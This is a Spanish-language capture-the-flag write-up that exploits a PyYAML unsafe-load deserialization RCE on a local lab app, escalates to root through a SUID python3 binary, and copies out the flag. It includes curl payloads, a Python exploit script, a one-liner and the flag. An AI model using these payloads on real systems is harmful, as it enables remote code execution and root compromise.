# 🚩 HackFest CTF - Writeup

## 🚀 **INICIO RÁPIDO**

```bash
# Levantar CTF
sudo docker-compose up -d

# Verificar funcionamiento
curl -s http://localhost:3000 | grep -o '<title>.*</title>'
```

**CTF disponible en:** http://localhost:3000

---

## 🎯 **EXPLOTACIÓN DIRECTA**

### **1. Reconocimiento**
```bash
# Información del sistema
curl -s http://localhost:3000/api/system | jq .
```

### **2. Explotar PyYAML RCE**
```bash
# Probar endpoint vulnerable
curl -s -X POST http://localhost:3000/config \
  -H "Content-Type: application/x-yaml" \
  -d "test: value"

# Verificar RCE
curl -s -X POST http://localhost:3000/config \
  -H "Content-Type: application/x-yaml" \
  -d $'!!python/object/apply:os.system\n- id'
```

### **3. Escalada de Privilegios + Exfiltración**
```bash
# Usar python3 SUID para obtener root y copiar flag
curl -s -X POST http://localhost:3000/config \
  -H "Content-Type: application/x-yaml" \
  -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.setuid(0); os.system(\'cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt\')"'
```

### **4. Obtener Flag**
```bash
# Descargar flag exfiltrada
curl -s http://localhost:3000/uploads/flag.txt
```

---

## 🐍 **SCRIPT DE EXPLOIT**

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:3000"

def exploit():
    print("🚀 HackFest CTF - Exploit")

    # Payload PyYAML RCE + Escalada + Exfiltración
    payload = """!!python/object/apply:os.system
- python3 -c "import os; os.setuid(0); os.system('cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt')" """

    print("1. Explotando PyYAML RCE...")
    r = requests.post(f"{BASE_URL}/config",
                     headers={'Content-Type': 'application/x-yaml'},
                     data=payload)

    if r.status_code == 200:
        print("✅ Exploit exitoso")

        print("2. Obteniendo flag...")
        flag_response = requests.get(f"{BASE_URL}/uploads/flag.txt")

        if flag_response.status_code == 200:
            flag = flag_response.text.split('\n')[0]  # Primera línea contiene la flag
            print(f"🏆 FLAG: {flag}")
        else:
            print("❌ Error obteniendo flag")
    else:
        print("❌ Error en exploit")

if __name__ == "__main__":
    exploit()
```

---

## 🔧 **DETALLES TÉCNICOS**

### **Vulnerabilidad**
- **PyYAML RCE**: `yaml.load()` con `UnsafeLoader`
- **Endpoint**: `/config` acepta YAML malicioso
- **Escalada**: `python3` con bit SUID permite ejecución como root

### **Arquitectura**
```
Cliente → Frontend (puerto 3000) → Backend (interno) → Sistema
```

### **Exfiltración**
- **Origen**: `/root/flag.txt` (solo root puede leer)
- **Destino**: `/app/static/flag.txt` (mapeado internamente)
- **Acceso**: `http://localhost:3000/uploads/flag.txt`

---

## 🏆 **FLAG**
```
HACKFEST{y4ml_rce_si_has_llegado_eres_god_freeeee}
```

---

## ⚡ **COMANDO ÚNICO**

```bash
# Exploit completo en una línea
curl -s -X POST http://localhost:3000/config -H "Content-Type: application/x-yaml" -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.setuid(0); os.system(\'cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt\')"' && curl -s http://localhost:3000/uploads/flag.txt
```
